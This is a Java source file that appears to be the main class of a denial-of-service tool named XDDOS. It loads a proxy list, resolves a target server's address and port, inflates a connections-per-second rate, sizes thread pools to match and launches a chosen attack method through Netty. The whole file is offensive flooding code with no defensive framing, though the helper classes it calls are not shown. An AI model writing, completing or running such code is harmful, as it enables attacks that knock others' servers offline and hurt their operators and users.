package XD.XDDOS;

import java.io.File;
import java.net.InetAddress;
import XD.XDDOS.methods.Method;
import XD.XDDOS.utils.ServerAddress;

public class XDDOS {
   //all variables 
   // make a file selector in gui so they can input proxy file or if they dont use that it will use proxy gen to gen proxy @glonk0

   public static String origIP;
   public static String srvRecord;
   public static InetAddress resolved;
   public static int port;
   public static int protcolID;  
   public static int protocolLength;
   public static String methodID;
   public static Method METHOD;
   public static int duration;
   public static int targetCPS;
   public static int nettyThreads;
   public static int loopThreads;
   public static ProxyLoader proxies;
   public static boolean attackIsRunning = false;

      public static void main(String ip, int protocol, String method, int time, int CPS) throws Throwable {

         protcolID = protocol;
         duration = time;
         targetCPS = CPS;
         proxies = (new ProxyGen(new File("proxies.txt"))).load();
        try {
         ServerAddress sa = ServerAddress.getAddrss(ip);
         srvRecord = sa.getIP();
         port = sa.getPort();
         resolved = InetAddress.getByName(srvRecord);
         origIP = ip.split(":")[0];
         targetCPS = CPS + (int) Math.ceil((double) CPS / 100 * (50 + (double) CPS / 5000));
         nettyThreads = targetCPS == -1 ? 256 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
         loopThreads = targetCPS == -1 ? 3 : (int) Math.ceil(1.999960000799984E-5D * (double) targetCPS);
         protocolLength = protocol > 128 ? 3 : 2;

         } catch (Exception e) {
         e.printStackTrace();
         Thread.sleep(5000L);
         return;
         }
         
         Methods.setupMethods();
         METHOD = Methods.getMethod(method);
         NettyBootstrap.start();
      }

   }
